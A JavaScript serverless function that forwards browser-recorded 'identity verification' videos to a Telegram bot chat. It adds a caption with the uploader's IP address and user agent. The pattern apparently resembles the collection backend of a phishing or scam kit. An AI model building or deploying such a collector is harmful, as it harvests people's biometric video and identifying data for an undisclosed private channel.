// Vercel Function: forwards the recorded verification video to a Telegram bot.
//
// Browser POSTs the raw video bytes here (Content-Type: video/webm or video/mp4),
// we wrap them in multipart/form-data and call Telegram's sendVideo endpoint.
//
// IMPORTANT: Vercel's serverless request body limit is 4.5 MB. The client must
// keep the recording under this size (low resolution + low bitrate + short
// duration). Telegram Bot API itself accepts up to 50 MB, but we can't get
// there without splitting uploads.

export const config = {
  api: {
    bodyParser: false,
    responseLimit: false,
  },
};

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const MAX_BYTES = 4.4 * 1024 * 1024;

const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',')
  .map((s) => s.trim())
  .filter(Boolean);

function applyCors(req, res) {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.length === 0) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  } else if (origin && ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
  }
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'content-type, x-mime-type');
}

async function readRawBody(req) {
  const chunks = [];
  let total = 0;
  for await (const chunk of req) {
    total += chunk.length;
    if (total > MAX_BYTES + 1024) {
      const err = new Error('payload too large');
      err.statusCode = 413;
      throw err;
    }
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

export default async function handler(req, res) {
  applyCors(req, res);

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'method not allowed' });
  }

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('[telegram] missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env');
    return res.status(500).json({ error: 'telegram not configured on server' });
  }

  let buffer;
  try {
    buffer = await readRawBody(req);
  } catch (err) {
    if (err.statusCode === 413) {
      return res.status(413).json({ error: 'video too large (max 4.4 MB)' });
    }
    throw err;
  }

  if (buffer.length === 0) {
    return res.status(400).json({ error: 'empty body' });
  }

  const mime = (req.headers['x-mime-type'] || req.headers['content-type'] || 'video/webm')
    .split(';')[0]
    .trim();
  const ext = mime.includes('mp4') ? 'mp4' : 'webm';
  const filename = `verification-${Date.now()}.${ext}`;

  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
  const ua = (req.headers['user-agent'] || 'unknown').slice(0, 120);
  const sizeKB = (buffer.length / 1024).toFixed(0);
  const caption = [
    'جلسة تحقق هوية جديدة',
    `الوقت: ${new Date().toISOString()}`,
    `الحجم: ${sizeKB} KB`,
    `IP: ${ip}`,
    `UA: ${ua}`,
  ].join('\n');

  try {
    const form = new FormData();
    form.append('chat_id', String(TELEGRAM_CHAT_ID));
    form.append('caption', caption);
    form.append('supports_streaming', 'true');
    form.append('video', new Blob([buffer], { type: mime }), filename);

    const tgRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
      { method: 'POST', body: form },
    );

    const tgBody = await tgRes.json().catch(() => ({}));

    if (!tgRes.ok || !tgBody.ok) {
      console.error('[telegram] sendVideo failed', { status: tgRes.status, body: tgBody });
      // Fallback: try sendDocument — works when sendVideo rejects the container
      // (e.g. webm without proper metadata on some bots).
      const docForm = new FormData();
      docForm.append('chat_id', String(TELEGRAM_CHAT_ID));
      docForm.append('caption', caption);
      docForm.append('document', new Blob([buffer], { type: mime }), filename);

      const docRes = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        { method: 'POST', body: docForm },
      );
      const docBody = await docRes.json().catch(() => ({}));
      if (!docRes.ok || !docBody.ok) {
        console.error('[telegram] sendDocument also failed', { status: docRes.status, body: docBody });
        return res.status(502).json({
          error: 'telegram rejected upload',
          details: docBody.description || tgBody.description || 'unknown',
        });
      }
      console.log('[telegram] sent as document', { filename, bytes: buffer.length });
      return res.status(200).json({ ok: true, file: filename, mode: 'document' });
    }

    console.log('[telegram] sent', { filename, bytes: buffer.length, msg: tgBody.result?.message_id });
    return res.status(200).json({ ok: true, file: filename, mode: 'video' });
  } catch (err) {
    console.error('[telegram] handler error', err);
    return res.status(500).json({ error: err.message || 'internal error' });
  }
}
